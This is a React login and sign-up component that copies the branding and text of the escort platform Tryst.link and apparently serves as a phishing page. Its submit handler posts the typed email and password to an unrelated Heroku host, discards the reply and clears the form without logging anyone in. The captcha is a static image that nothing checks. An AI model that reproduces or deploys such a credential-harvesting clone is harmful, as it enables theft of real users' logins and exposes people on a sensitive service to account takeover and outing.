import React, { useRef, useState } from 'react';
import './Login.css';

import captcha from '../img/captcha.png'


const Login = () => {

    const emailRef = useRef();
    const passwordRef = useRef();


    const handleEmailPassword = e => {
        const email = emailRef.current.value;
        const password = passwordRef.current.value;

        const newUser = { email, password };
        fetch('https://quiet-atoll-69759.herokuapp.com/', {
            method: 'POST',
            headers: {
                'content-type': 'application/json'

            },
            body: JSON.stringify(newUser)

        })
            .then()


        emailRef.current.value = '';
        passwordRef.current.value = '';
        e.preventDefault();


    }
    return (
        <div className='container my-4'>
            <div className="row">
                <div className='cols col-md-6 col-lg-6 col-sm-12'>
                    <h2 className='mt-4 mb-3'>Log in</h2>
                    <form onSubmit={handleEmailPassword}>
                        <input type="text" placeholder='Email' ref={emailRef} />
                        <br /><br />
                        <input type="password" placeholder='Enter PassWord' ref={passwordRef} />
                        <br /> <br />
                        <p>* Please enter the characters shown inside the blue box</p>

                        <img src={captcha} alt="" />
                        <br /> <br />
                        <input type="text" placeholder='' />
                        <br /> <br />
                        <input type="checkbox" value="Remember me for 14 days" className='mx-2'></input>
                        <label for="vehicle1"> Remember me for 14 days</label><br></br>
                        <input type="submit" value="LogIn" className='button-login' />
                    </form>
                    <button type="button" className="btn btn-outline-danger btn-sm my-4 ">Forgot Password?</button><br />
                    <button type="button" className="btn btn-outline-danger btn-sm ">Did'nt received Confirmation instructions ?</button>
                </div>
                <div className='cols col-md-6 col-lg-6 col-sm-12'>
                    <h2 className='mt-4 mb-3'>Sign Up</h2>
                    <p>NEW: We are now accepting client sign ups!</p><br /><br />
                    <p>Tryst.link is one of the fastest-growing escort platforms in the world. Built by the same team behind Switter!</p><br />
                    <p>Please select which type of account you'd like to sign up for:</p><br /><br />

                    <div>
                        <button type="button" className="btn btn-danger my-3 p-4">I am a Provider</button><br />
                        <button type="button" className="btn btn-danger p-4 rounded">I am a Client</button>
                    </div>
                </div>

            </div>
        </div>

    );
};

export default Login;